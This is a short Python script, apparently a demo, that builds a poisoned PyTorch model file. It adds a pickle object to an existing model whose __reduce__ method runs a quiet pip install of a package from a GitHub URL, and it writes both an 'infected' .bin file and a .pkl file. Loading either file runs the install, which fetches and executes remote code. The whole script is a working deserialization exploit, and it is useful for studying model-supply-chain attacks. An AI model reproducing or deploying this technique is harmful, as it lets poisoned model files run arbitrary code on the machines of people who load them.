import pickle

import pip
import torch

class PipInstallExploit:
    def __reduce__(self):
        return pip.main, (
        ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
         '--exists-action', 'i', '--isolated'],)


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("pytorch_model.bin")

    # Add the malicious class to the end of the model
    malicious_model["exploit"] = PipInstallExploit()

    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.bin")
    pickle.dump(PipInstallExploit(), open("infected_model.pkl", "wb"))

if __name__ == "__main__":
    make_infected_model()
